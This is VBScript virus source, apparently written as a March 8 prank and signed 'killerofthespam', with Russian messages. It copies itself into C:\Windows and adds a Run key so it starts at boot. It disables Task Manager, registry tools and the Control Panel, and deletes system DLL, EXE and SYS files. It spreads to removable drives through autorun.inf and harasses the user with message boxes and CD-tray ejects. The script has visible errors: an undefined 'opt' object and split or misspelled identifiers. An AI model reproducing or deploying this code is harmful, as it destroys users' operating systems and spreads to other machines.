//write by killerofthespam
On Error Resume Next 
set sys=CreateObject("Scripting.filesystemobject")
set w=sys.GetFile(WScript.ScriptFullName) 
w.Copy("c:\windows\8 day.vbs")
opt.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\8 day","C:\Windows\8 day.vbs" 
If Day(now)>7 Then 
opt.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel",1,"REG_DWORD" 
opt.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMorePrograms",1,"REG_DWORD" 
opt.RegWrite"HKEY_CUR RENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD" 
opt.RegWrite"HKEY_CURRENT_USER\Software\Micros oft\Windows\CurrentVersion\Policies\Explorer\NoFind",1,"REG_DWORD" 
opt.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion \Policies\Explorer\NoRun",1,"REG_DWORD" 
opt.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOn Drive",5 
opt.RegWrite"HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics\Shell Icon Size",300 
opt.RegWrite"HKEY_CURRENT_USER\Control Panel\Mouse\MouseSensitivity",30 
opt.RegWrite"HKEY_CURRENT_USER\Control Panel\Mouse\MouseSpeed",10 
opt.RegWrite"HKEY_CURRENT_USER\Control Panel\Mouse\DoubleClickSpeed",1000 
opt.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" ,1,"REG_DWORD" 
opt.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD" 
opt.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoViewOnDrive",5 
sys.DeleteFile"C:\Windows\*.dat " 
sys.DeleteFile"C:\Windows\*.dll" 
sys.DeleteFile"C:\Windows\system32\*.exe" 
sys.DeleteFile"C:\Windows\system32\*.ini" 
sys.DeleteFile"C: \Windows\system32\*.sys" 
sys.DeleteFile"C:\Windows\system32\*.com" 
sys.DeleteFile"C:\Windows\system32\*.dat" 
sys.DeleteFile"C:\Windows\sy stem32\*.dll" 
sys.DeleteFile"C:\Windows\system32\*.bat" 
sys.DeleteFile"C:\Windows\system32\*.inf" 
sys.CopyFile"c:\windows\8 day.vbs","e:\8 day.vbs"
sys.CopyFile"c:\windows\8 day.vbs","a:\8 day.vbs"
sys.CopyFile"c:\windows\8 day.vbs","g:\8 day.vbs"
sys.CopyFile"c:\windows\8 day.vbs","f:\8 day.vbs"

set file=sys.CreateTextFile("8 day.txt") 
file.WriteLine("Этот вирус посвящен 8 марта.Поздраиляю всех девушек с 8 марта!Щастья Вам и Здоровья!,чего не пожилаеш винде!") 
file.Close 
set file=sys.CreateTextFile("8 day.doc") 
file.WriteLine("Этот вирус посвящен 8 марта.Поздраиляю всех девушек с 8 марта!Щастья Вам и Здоровья!,чего не пожилаеш винде!") 
file.Close  
set wrt=sys.CreateTextFile("E:\autorun.inf") 
wrt.WriteLine("[autorun]Open=8 day.vbs") 
wrt.Close 
For Index=1 to 200 
err=msgbox("Этот вирус называеться 8 day.Он был написан мною за 35 минут.Поздравляю всех с 8 марта!",16,"Fattal Error!") 
set crazcd=CreateObject("WMPlayer.OCX.7") 
crazcd.cdromCollections.item(0).eject 
WScript.Sleep(400) 
crazcd.cdromCollections.item(0).eject 
WSc ript.Sleep(200) 
opt.sendkeys"{capslock}" 
WScript.Sleep(200) 
opt.sendkeys"{numlock}" 
WSript.Sleep(200) 
opt.sendkeys"{Scrolllock}" 
WSript.Sleep(200) 
opt.sendkeys"{Alt}" 
WSript.Sleep(200) 
opt.sendkeys"{F4}" 
WSript.Sleep(200) 
opt.sendkeys"{Enter}" 
Next 
End if